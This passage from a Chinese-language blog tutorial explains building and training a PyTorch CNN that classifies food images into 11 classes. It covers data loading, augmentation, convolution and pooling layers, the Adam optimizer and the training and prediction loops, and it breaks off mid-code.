<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>(<span class="params">path, label</span>):</span><br><span class="line">    <span class="comment"># label 是一个 boolean variable</span></span><br><span class="line">    image_dir = <span class="built_in">sorted</span>(os.listdir(path))</span><br><span class="line">    <span class="comment">#获取path下的文件名列表</span></span><br><span class="line">    x = np.zeros((<span class="built_in">len</span>(image_dir), <span class="number">128</span>, <span class="number">128</span>, <span class="number">3</span>), dtype=np.uint8)</span><br><span class="line">    <span class="comment">#输入数据集的大小，其中每一个样本是一个128*128*3的样本图片</span></span><br><span class="line">    y = np.zeros((<span class="built_in">len</span>(image_dir)), dtype=np.uint8)</span><br><span class="line">    <span class="comment">#y是对应每一个样本的输出值</span></span><br><span class="line">    <span class="keyword">for</span> i, file <span class="keyword">in</span> <span class="built_in">enumerate</span>(image_dir):</span><br><span class="line">        img = cv2.imread(os.path.join(path, file))</span><br><span class="line">        <span class="comment">#使用cv2.imread读入一张图片</span></span><br><span class="line">        x[i, :, :] = cv2.resize(img,(<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line">        <span class="comment">#将原图片转化为128*128的图片</span></span><br><span class="line">        <span class="keyword">if</span> label:</span><br><span class="line">          y[i] = <span class="built_in">int</span>(file.split(<span class="string">&quot;_&quot;</span>)[<span class="number">0</span>])</span><br><span class="line">        <span class="comment">#如果图片标签中有_说明是train或者validation有分类的数据</span></span><br><span class="line">    <span class="keyword">if</span> label:</span><br><span class="line">      <span class="keyword">return</span> x, y</span><br><span class="line">    <span class="comment">#如果有label就区分为x和y</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> x</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="3-1-2-data-augmentation"><a href="#3-1-2-data-augmentation" class="headerlink" title="3.1.2 data augmentation"></a>3.1.2 data augmentation</h5><p>​    数据增强主要用于在dataset比较小的时候防止过拟合，随着神经网络的深度增加，数据集过小的时候，过多的参数会拟合数据的所有特点，而非数据之间的共性，那么模型就会缺乏泛化能力，而数据增强由于增加了噪声和变化，能够让模型更好的提取共性，从而防止过拟合的发生。数据增强的左右可以总结为下点：</p>
<ol>
<li>增加训练的数据量，提高模型的泛化能力</li>
<li>增加噪声数据，提升模型的鲁棒性</li>
<li>一定程度上能解决过拟合问题，样本过少容易出现过拟合</li>
<li>解决样本不平衡问题，例如某个类别过少，数据增强可以增强这个类别的数量。</li>
</ol>
<p>​    对于一个卷积神经网络，如果能够对物体即使它放在不同的地方也能够进行稳健的分类，就被称为具有不变性的属性。更具体的，CNN可以对移位(translation)、视角(viewpoint)、大小(size)、照明(illumination)等具有不变性。</p>
<p>​    下面是几种常见的数据增强方法：</p>
<p>1.随机旋转<br>随机旋转一般情况下是对输入图像随机旋转[0,360)<br>2.随机裁剪<br>随机裁剪是对输入图像随机切割掉一部分<br>3.色彩抖动<br>色彩抖动指的是在颜色空间如RGB中，每个通道随机抖动一定的程度。在实际的使用中，该方法不常用，在很多场景下反而会使实验结果变差<br>4.高斯噪声<br>是指在图像中随机加入少量的噪声。该方法对防止过拟合比较有效，这会让神经网络不能拟合输入图像的所有特征<br>5.水平翻转<br>6.竖直翻转</p>
<p>​    在模型训练中，我们可以用pytorch中的transform方法来进行data augmentation，但是并不是每一种augmentation对当前模型训练都有正向作用，这需要我们进行尝试。<a href="https://pytorch.org/vision/stable/transforms.html">转换和增强图像 — Torchvision 0.14 文档 (pytorch.org)</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># training 時做 data augmentation</span></span><br><span class="line">train_transform = transforms.Compose([</span><br><span class="line">    transforms.ToPILImage(),</span><br><span class="line">    <span class="comment">#将张量转为PIL图片，由小数转为0-255之间的像素值</span></span><br><span class="line">    transforms.RandomHorizontalFlip(),<span class="comment">#随机将图片进行水平翻转</span></span><br><span class="line">    transforms.RandomRotation(<span class="number">15</span>), <span class="comment">#随机旋转图片</span></span><br><span class="line">    transforms.ToTensor(), <span class="comment">#将图片转成Tensor，并把数值normalize到[0,1](data normalization)</span></span><br><span class="line">])</span><br><span class="line"><span class="comment"># testing 時不需做 data augmentation</span></span><br><span class="line">test_transform = transforms.Compose([</span><br><span class="line">    transforms.ToPILImage(),                                    </span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
<h5 id="3-1-3-类型转化"><a href="#3-1-3-类型转化" class="headerlink" title="3.1.3 类型转化"></a>3.1.3 类型转化</h5><p>​    流程是先把原始数据转变成 torch.utils.data.Dataset类随后再把得到的torch.utils.data.Dataset类<br>当作一个参数传递给  torch.utils.data.DataLoader类，得到一个数据加载器，这个数据加载器每次可以返回<br>一个 Batch 的数据供模型训练使用。</p>
<p>​    这里 torch.utils.data.Dataset是一个抽象类，用户想要加载自定义的数据只需要继承这个类，并且覆写其中的两个方法即可：</p>
<p>1.__len__:实验len(dataset)返回整个数据集的大小</p>
<p>2.__getitem__用来获取一些索引的数据，使dataset[i]返回数据集中的第i个样本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ImgDataset</span>(<span class="title class_ inherited__">Dataset</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, x, y=<span class="literal">None</span>, transform=<span class="literal">None</span></span>):</span><br><span class="line">        self.x = x</span><br><span class="line">        <span class="comment"># label is required to be a LongTensor</span></span><br><span class="line">        self.y = y</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.y = torch.LongTensor(y)<span class="comment">#将数据y转化为longtensor类型</span></span><br><span class="line">        self.transform = transform</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__len__</span>(<span class="params">self</span>):<span class="comment">#返回自定义数据集的大小</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(self.x)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, index</span>):<span class="comment">#支持下标访问</span></span><br><span class="line">        X = self.x[index]</span><br><span class="line">        <span class="keyword">if</span> self.transform <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            X = self.transform(X)</span><br><span class="line">        <span class="keyword">if</span> self.y <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            Y = self.y[index]</span><br><span class="line">            <span class="keyword">return</span> X, Y</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> X</span><br><span class="line">        batch_size = <span class="number">128</span></span><br><span class="line">train_set = ImgDataset(train_x, train_y, train_transform)</span><br><span class="line">val_set = ImgDataset(val_x, val_y, test_transform)</span><br><span class="line">train_loader = DataLoader(train_set, batch_size=batch_size, shuffle=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#batch_size是每次迭代的数量，shuffle是每次epoch是否进行重排</span></span><br><span class="line">val_loader = DataLoader(val_set, batch_size=batch_size, shuffle=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>​    在dataloader中，需要给出一个合适的Batch size，合适的Batch size能够让模型更好的进行梯度下降，但是还需要考虑GPU资源的大小。</p>
<h4 id="3-2神经网络分类器架构"><a href="#3-2神经网络分类器架构" class="headerlink" title="3.2神经网络分类器架构"></a>3.2神经网络分类器架构</h4><p>​    下图为CNN的整体架构，主要分为</p>
<ul>
<li>Convolution</li>
<li>Max Pooling</li>
<li>Flatten</li>
</ul>
<p>​                                  <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121164040095.png" alt="image-20221121164040095" style="zoom:67%;" /></p>
<h5 id="3-2-1-Convolution"><a href="#3-2-1-Convolution" class="headerlink" title="3.2.1 Convolution"></a>3.2.1 Convolution</h5><p>​    Convolution是卷积层，就是使用卷积核对image进行步长为strider的平移，依次于image对应的小矩阵中的元素计算内积，假设你有一张128x128的image，你用n个3x3的Filter去对它做convolution，那么你会得到nx126x126的cube(无padding)，多少个Filter就会有多少层。对于RGB三色图，有R、G、B三个通道，所以就等于输入了三张图片，那么相应的filter就会变为3维3x3x3，filter的厚度对应图片的厚度，那么最终filter过滤后的矩阵就是RGB三个通道位置内积和。</p>
<p>​    <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/cf5cb5a3e2553f3d74e5a98267d9b2ab.gif" alt="在这里插入图片描述" style="zoom:67%;" /></p>
<p>​        卷积层的作用是对局部的小特征进行提取，filter中的参数是需要network进行学习的，采用strider=1能够防止两个矩阵交界出的feature被遗漏，能够对整个image进行充分的遍历。其中一个filter对应的是一种pattern，一个神经网络中一般需要加入很多filter来提取不同的特征，原图和许多filter计算以后就会得到feature map。</p>
<p>​        通过covolution能够实现两个特性，一是能够从全图中提取一些小的特征，二是能够将不同区域的相同特征提取出来，和全连接神经网络相比，使用filter的做法能够减少参数的使用，因为对于一个3*3的filter，只和原图片中一个小矩阵有关。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121170829432.png" alt="image-20221121170829432" style="zoom:67%;" /></p>
<p>​    另外，在全连接层中不同神经元使用的参数是不同的，而filter的做法能够使用共享的参数，所以参数量再次减少。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121170957868.png" alt="image-20221121170957868" style="zoom:67%;" /></p>
<p>在pytorch中，可以使用下面的函数来实现卷积层</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nn.Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">64</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>in_channels表示的是输入卷积层的图片厚度</li>
<li>out_channels表示的是输出的厚度，也就是filter的数目</li>
<li>kernel_size表示的是卷积核的大小，也就是filter的大小，可以用一个数字表示长宽相等的卷积核， 也可以用不同的数据来表示长宽不同的卷积核，比如kernel_size=(3,2)</li>
<li>strider表示的是卷积核滑动的步长</li>
<li>padding是在图片周围补充0，padding=0表示不填充,padding=1表示填充一维这样就可以将提取范围扩展 到更加边界的区域，如前两行，其中前面一行已经预先填入了0</li>
</ul>
</blockquote>
<h5 id="3-2-2-Maxpooling"><a href="#3-2-2-Maxpooling" class="headerlink" title="3.2.2 Maxpooling"></a>3.2.2 Maxpooling</h5><p>​    Maxpooling (池化层)，Maxpooling的作用是减少像素点的个数，这样对图片的影响不会太大，但是能将训练数据的个数大大减少。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121171924114.png" alt="image-20221121171924114" style="zoom: 67%;" /></p>
<p>​    在pytorch中Maxpooling可以用以下的函数进行实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nn.MaxPool2d(kernel_size =<span class="number">2</span>, stride=<span class="number">2</span>, padding=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<p> nn.MaxPool2d(kernel_size =2, stride=2, padding=0)<br>池化层，也就是根据kernel_size和strider,对convolution得到的cube区域进行分割并取区域的最大值</p>
</blockquote>
<p>在经过第一次convlution和Max pooling之后，image变为了2x2，2 layer的cube，再次经过上述过程后，image的layer不会增加，始终为filter的数目，这是因为下一次convolution时会考虑image-cube的深度。</p>
<h5 id="3-2-3-CNN完整结构"><a href="#3-2-3-CNN完整结构" class="headerlink" title="3.2.3 CNN完整结构"></a>3.2.3 CNN完整结构</h5><p>​    经过一次Convolution和Max Pooling等于学习到了更小的，并提取关键特征的图片，这样的过程可以进行循环迭代多次，然后展平flatten送入全连接神经网络进行训练。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121192343694.png" alt="image-20221121192343694" style="zoom:67%;" /></p>
<p>​    在pytorch中，我们可以使用nn.sequential来实现这个过程， nn.sequential()是一个序列容器，用于搭建神经网络的模块按照被传入构造器的顺序添加到nn.sequential()中，利用nn.Sequential()搭建好模型架构，模型前向传播时调用forward()方法，模型接收的输入首先被传入nn.Sequential()包含的第一个网络模块中。然后，第一个网络模块的输出传入第二个 网络模块作为输入，按照顺序依次计算并传播，直到nn.Sequential()里的最后一个模块输出结果。</p>
<p>​    与一层一层的单独调用模块组成序列相比，nn.Sequential() 可以允许将整个容器视为单个模块（即相当于把多个模块封装成一个模块），forward()方法接收输入之后，nn.Sequential()按照内部模块的顺序自动依次计算并输出结果。具体的实现过程如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">self.cnn = nn.Sequential(</span><br><span class="line">      nn.Conv2d(in_channels=<span class="number">3</span>, out_channels=<span class="number">64</span>, kernel_size=<span class="number">3</span>, stride=<span class="number">1</span>, padding=<span class="number">1</span>),</span><br><span class="line">      nn.BatchNorm2d(<span class="number">64</span>),<span class="comment"># 归一化处理,参数是64</span></span><br><span class="line">      nn.ReLU(),</span><br><span class="line">      nn.MaxPool2d(kernel_size =<span class="number">2</span>, stride=<span class="number">2</span>, padding=<span class="number">0</span>),   </span><br><span class="line">      <span class="comment">#由于padding了前后两列0，并且kernel大小为3，其实filter过滤后图片并无减小，减小只是在</span></span><br><span class="line">      <span class="comment">#maxpool池化，[64,64,64]64是filter，image-map</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      nn.Conv2d(<span class="number">64</span>,<span class="number">128</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">      <span class="comment">#[128,64,64]这里我们取128个卷积核</span></span><br><span class="line">      nn.BatchNorm2d(<span class="number">128</span>),</span><br><span class="line">      nn.ReLU(),</span><br><span class="line">      nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">      <span class="comment">#[128,32,32]</span></span><br><span class="line">      </span><br><span class="line">      nn.Conv2d(<span class="number">128</span>,<span class="number">256</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">      <span class="comment">#[256,32,32]这里我们取256个卷积核</span></span><br><span class="line">      nn.BatchNorm2d(<span class="number">256</span>),</span><br><span class="line">      nn.ReLU(),</span><br><span class="line">      nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">      <span class="comment">#[256,16,16]</span></span><br><span class="line"></span><br><span class="line">      nn.Conv2d(<span class="number">256</span>,<span class="number">512</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">      <span class="comment">#[512,16,16]这里我们取512个卷积核</span></span><br><span class="line">      nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">      nn.ReLU(),</span><br><span class="line">      nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">      <span class="comment">#[512,8,8]</span></span><br><span class="line">      </span><br><span class="line">      nn.Conv2d(<span class="number">512</span>,<span class="number">512</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">1</span>),</span><br><span class="line">      <span class="comment">#[512,8,8]这里我们取512个卷积核</span></span><br><span class="line">      nn.BatchNorm2d(<span class="number">512</span>),</span><br><span class="line">      nn.ReLU(),</span><br><span class="line">      nn.MaxPool2d(<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>),</span><br><span class="line">      <span class="comment">#[512,4,4]#最后输出的cube，之后展开为全连接网络</span></span><br><span class="line">      </span><br><span class="line">  )</span><br></pre></td></tr></table></figure>
<p>​    这里卷积核取的越来越多，这里是将小特征逐步进行汇总成更多的大特征来对图像进行处理。</p>
<h4 id="3-3-全连接神经网络"><a href="#3-3-全连接神经网络" class="headerlink" title="3.3 全连接神经网络"></a>3.3 全连接神经网络</h4><h5 id="3-3-1-全连接层"><a href="#3-3-1-全连接层" class="headerlink" title="3.3.1 全连接层"></a>3.3.1 全连接层</h5><p>​    下面的过程我们将展平后的数据放入全连接神经网络中进行训练，在全连接神经网络中，我们逐步减小hiding layer中神经元的数量，也就是逐步细化分类，最终输出11种food分类的结果。</p>
<p>​    在pytorch中，我们可以使用nn.linear来设置网络中的全连接层，在全连接层的输入与输出都是二维张量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.nn.Linear(in_features,out_features,bias=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>in_feature:上层神经元的个数，输入样本的大小</li>
<li>out_feature:本层神经元的个数，也就是输出样本的大小</li>
<li>​    bias:偏置，如果为false就不会学习附加偏置</li>
</ul>
</blockquote>
<h5 id="3-3-2-激活函数"><a href="#3-3-2-激活函数" class="headerlink" title="3.3.2 激活函数"></a>3.3.2 激活函数</h5><p>​    在数据通过全连接层后，然后会通过激活函数，这里我们采用的是ReLU函数，相比与sigmoid函数，能够在深度比较大的网络中处理梯度消失的问题。在sigmoid函数中，由于强制的将值域压制在0和1之间，当sigmoid接近饱和区时，梯度就会趋近于0，在深度网络中，经过这样层层的压缩，最初w的增量就无法传播到最后的输出值上，也就会在梯度下降中出现梯度消失的情况。</p>
<p>​    而ReLU函数会使一部分神经元的输出为0，这样就造成了网络的稀疏性，并减少了参数之间相互依存，缓解了过拟合现象。另外求导不涉及除法，反向传播简单。ReLU函数的引入并不改变激活函数的非线性特性，虽然在最终训练结果上好像是线性存在的，但是ReLU函数是一个分段函数，在没有训练完成的情况下，整个模型仍然有非线性存在。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121201641639.png" alt="image-20221121201641639" style="zoom:67%;" /></p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/241900156879853.png" alt="img" style="zoom:67%;" /></p>
<p>在pytorch中可以直接使用下面的语句进行激活函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nn.ReLU()</span><br></pre></td></tr></table></figure>
<h5 id="3-3-3-完整的全连接神经网络"><a href="#3-3-3-完整的全连接神经网络" class="headerlink" title="3.3.3 完整的全连接神经网络"></a>3.3.3 完整的全连接神经网络</h5><p>​    在forward函数是正向进行整个的训练过程，输入x[[batch_size, 3, 128, 128]],输出[batch_size, 11]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    self.fc = nn.Sequential(</span><br><span class="line">        nn.Linear(<span class="number">512</span>*<span class="number">4</span>*<span class="number">4</span>,<span class="number">1024</span>),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        nn.Linear(<span class="number">1024</span>,<span class="number">512</span>),</span><br><span class="line">        nn.ReLU(),</span><br><span class="line">        nn.Linear(<span class="number">512</span>,<span class="number">11</span>)<span class="comment">#11个类别，11中输出</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">    out = self.cnn(x)</span><br><span class="line">    out = out.view(out.size()[<span class="number">0</span>], -<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#flatten the feature map</span></span><br><span class="line">    <span class="keyword">return</span> self.fc(out)</span><br></pre></td></tr></table></figure>
<h4 id="3-4-模型训练"><a href="#3-4-模型训练" class="headerlink" title="3.4 模型训练"></a>3.4 模型训练</h4><p>​    下面我们进行模型训练的过程，这里我们可以使用GPU对模型训练进行加速</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = Classifier().cuda()</span><br><span class="line"><span class="comment">#将模型加载到GPU上进行计算</span></span><br></pre></td></tr></table></figure>
<p>​    这里我们梯度下降过程使用Adam优化器进行实现，它是目前认为最好的梯度下降算法。</p>
<p>​    在模型训练中，不同方向的gradient是不同的，使用Adagrad的方式，能够对不同的方向给出不同的学习率（用二阶导数来逼近最佳步长），在深度学习中，梯度将变得复杂，因此我们要用更新的方式进行优化。在Adagrad中，我们知道Adagrad的learning rate是所有gradient的均方根，而在RMSProp中，梯度的均方根将加入一个权重系数，<img src="https://private.codecogs.com/gif.latex?%5Calpha" alt="\alpha">越小，代表越倾向于相信此时算出来的新的gradient所告诉你的error surface的陡峭程度；而<img src="https://private.codecogs.com/gif.latex?%5Calpha" alt="\alpha">越大，则代表越倾向于相信以往算出来的gradient 。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121202449706.png" alt="image-20221121202449706" style="zoom:67%;" /></p>
<p>​    另一个优化方式是在梯度下降中加入冲量， 现实世界中，一个球由高处往地处走，到达最低点后并不会直接停下来，可能会由于惯性的影响再移动一点。所以就想到把惯性的因素也考虑进gradient descent里面，就不会因为遇到local minima而直接卡主。</p>
<p>​                                     <img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221121202507013.png" alt="image-20221121202507013" style="zoom:67%;" /></p>
<p>​    因此我们就可以在梯度下降过程中加入一些上一个梯度的权重，让上一步的移动对下一步的移动产生纠正，当权重设置的合理时，也许函数就能够越过局部最低点或者平地(只是一种可能)。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/20200218170852194.png" alt="img" style="zoom:67%;" /></p>
<p> 把刚才讲的RMSProp 和 Momentum 结合起来，就形成Adam，具体在pytorch中的训练过程如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">model = Classifier().cuda()</span><br><span class="line"><span class="comment">#将模型加载到GPU上进行计算</span></span><br><span class="line">loss = nn.CrossEntropyLoss()</span><br><span class="line"><span class="comment"># 因為、为是 classification task，所以 loss 使用 CrossEntropyLoss</span></span><br><span class="line">optimizer = torch.optim.Adam(model.parameters(), lr=<span class="number">0.001</span>) </span><br><span class="line"><span class="comment"># optimizer 使用 Adam优化器</span></span><br><span class="line">num_epoch = <span class="number">30</span></span><br><span class="line"><span class="comment">#epoch回合迭代的次数是30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epoch):</span><br><span class="line">    epoch_start_time = time.time()</span><br><span class="line">    train_acc = <span class="number">0.0</span></span><br><span class="line">    train_loss = <span class="number">0.0</span></span><br><span class="line">    val_acc = <span class="number">0.0</span></span><br><span class="line">    val_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    model.train() <span class="comment"># 確保 model 是在 train model </span></span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_loader):<span class="comment">#这里每次训练一个batchsize的量进行梯度下降</span></span><br><span class="line">        optimizer.zero_grad() <span class="comment">#用optimizer将梯度下降中的梯度初始化为0</span></span><br><span class="line">        train_pred = model(data[<span class="number">0</span>].cuda()) <span class="comment">#data[0].cuda是将训练数据x放到GPU上</span></span><br><span class="line">        <span class="comment">#利用module得到预测的概率，其实就是调用module的forward函数</span></span><br><span class="line">        batch_loss = loss(train_pred, data[<span class="number">1</span>].cuda()) </span><br><span class="line">        <span class="comment">#将Y真实值从cpu加载到GPU上，然后利用交叉熵计算loss损失值</span></span><br><span class="line">        batch_loss.backward() </span><br><span class="line">        <span class="comment">#计算loss函数的反向梯度，也就是利用反向传播计算gradient</span></span><br><span class="line">        optimizer.step() </span><br><span class="line">        <span class="comment">#用Adam梯度下降，也就是optimizer更新参数值</span></span><br><span class="line">        train_acc += np.<span class="built_in">sum</span>(np.argmax(train_pred.cpu().data.numpy(), axis=<span class="number">1</span>) == data[<span class="number">1</span>].numpy())</span><br><span class="line">        <span class="comment">#将预测准确的数据量加起来。np.argmax用于返回一个numpy数组中最大值的索引值</span></span><br><span class="line">        train_loss += batch_loss.item()</span><br><span class="line">        <span class="comment">#将计算的loss加入到损失函数序列中</span></span><br><span class="line">    </span><br><span class="line">    model.<span class="built_in">eval</span>()</span><br><span class="line">    <span class="comment">#主要是针对model 在训练时和评价时不同的 Batch Normalization 和 Dropout 方法模式</span></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        <span class="comment">#不存储中间过程，不计算梯度</span></span><br><span class="line">        <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(val_loader):</span><br><span class="line">            val_pred = model(data[<span class="number">0</span>].cuda())</span><br><span class="line">            batch_loss = loss(val_pred, data[<span class="number">1</span>].cuda())</span><br><span class="line"></span><br><span class="line">            val_acc += np.<span class="built_in">sum</span>(np.argmax(val_pred.cpu().data.numpy(), axis=<span class="number">1</span>) == data[<span class="number">1</span>].numpy())</span><br><span class="line">            val_loss += batch_loss.item()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#把結果 print 出來</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[%03d/%03d] %2.2f sec(s) Train Acc: %3.6f Loss: %3.6f | Val Acc: %3.6f loss: %3.6f&#x27;</span> % \</span><br><span class="line">            (epoch + <span class="number">1</span>, num_epoch, time.time()-epoch_start_time, \</span><br><span class="line">             train_acc/train_set.__len__(), train_loss/train_set.__len__(), val_acc/val_set.__len__(), val_loss/val_set.__len__()))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;得到好的参数后，使用 training set 和 validation set 共同训练&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="3-5-结果预测"><a href="#3-5-结果预测" class="headerlink" title="3.5 结果预测"></a>3.5 结果预测</h4><p>​    得到参数以后我们再将train和vaildation set进行拼接训练，最后将数据预测输出到文件里，这里要解释一下dataloader里的enumerate方法，这里每个i对应一个batch_size而不是一个数据。完成的过程如下，具体解释已在注释中给出：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_val_x = np.concatenate((train_x, val_x), axis=<span class="number">0</span>)  <span class="comment">#将train_set和vailidation_set按行进行拼接</span></span><br><span class="line"><span class="comment">#这里拼接的结果是train_x第一个维度因为拼接扩大其他维度不变，train_y仍然保持一维的大小</span></span><br><span class="line">train_val_y = np.concatenate((train_y, val_y), axis=<span class="number">0</span>)  <span class="comment">#将train_y和vailidation_y按行进行拼接</span></span><br><span class="line">train_val_set = ImgDataset(train_val_x, train_val_y, train_transform)  <span class="comment">#将合并后的x用trian_trainsform方法转化为Dataset</span></span><br><span class="line"></span><br><span class="line">train_val_loader = DataLoader(train_val_set, batch_size=batch_size, shuffle=<span class="literal">True</span>)  <span class="comment">#将合并后dataset按batchsize转化为Dataloader并进行数据重排</span></span><br><span class="line"></span><br><span class="line">model_best = Classifier().cuda()  <span class="comment">#将模型的所有参数和缓存移动到GPU上</span></span><br><span class="line">loss = nn.CrossEntropyLoss()   <span class="comment">#用交叉熵的方法计算损失函数</span></span><br><span class="line">optimizer = torch.optim.Adam(model_best.parameters(), lr=<span class="number">0.001</span>)   <span class="comment">#用Adam方法优化梯度下降函数将学习率定位0.001</span></span><br><span class="line"><span class="comment">#model_best.parameters用于更新参数信息</span></span><br><span class="line">num_epoch = <span class="number">30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> <span class="built_in">range</span>(num_epoch):</span><br><span class="line">    epoch_start_time = time.time()</span><br><span class="line">    train_acc = <span class="number">0.0</span></span><br><span class="line">    train_loss = <span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">    model_best.train()</span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_val_loader):</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        train_pred = model_best(data[<span class="number">0</span>].cuda())  <span class="comment">#将train_data放入模型中，并利用模型得到预测的概率分布，其实就是调用model的forward方法</span></span><br><span class="line">        batch_loss = loss(train_pred, data[<span class="number">1</span>].cuda())  <span class="comment">#用y的真实值和预测值按交叉熵的方式计算损失</span></span><br><span class="line">        batch_loss.backward()  <span class="comment">#反向传播计算更新gradient</span></span><br><span class="line">        optimizer.step()  <span class="comment">#用optimizer，也就是Adam梯度优化更新参数值</span></span><br><span class="line"></span><br><span class="line">        train_acc += np.<span class="built_in">sum</span>(np.argmax(train_pred.cpu().data.numpy(), axis=<span class="number">1</span>) == data[<span class="number">1</span>].numpy())</span><br><span class="line">        train_loss += batch_loss.item()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#將結果 print 出來</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[%03d/%03d] %2.2f sec(s) Train Acc: %3.6f Loss: %3.6f&#x27;</span> % \</span><br><span class="line">      (epoch + <span class="number">1</span>, num_epoch, time.time()-epoch_start_time, \</span><br><span class="line">      train_acc/train_val_set.__len__(), train_loss/train_val_set.__len__()))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;# Testing</span></span><br><span class="line"><span class="string">利用刚刚 train 好的 model 进行 prediction</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">test_set = ImgDataset(test_x, transform=test_transform)</span><br><span class="line"><span class="comment">#将text_x按test_transform处理为Dataset</span></span><br><span class="line">test_loader = DataLoader(test_set, batch_size=batch_size, shuffle=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#将test_set按照batchsize处理为Dataloader，不进行数据重排</span></span><br><span class="line"></span><br><span class="line">model_best.<span class="built_in">eval</span>()</span><br><span class="line">prediction = []</span><br><span class="line"><span class="keyword">with</span> torch.no_grad():<span class="comment">#当requires_grad设置为False时,反向传播时就不会自动求导了，因此大大节约了显存或者说内存</span></span><br><span class="line">    <span class="keyword">for</span> i, data <span class="keyword">in</span> <span class="built_in">enumerate</span>(test_loader):</span><br><span class="line">        test_pred = model_best(data.cuda())</span><br><span class="line">        test_label = np.argmax(test_pred.cpu().data.numpy(), axis=<span 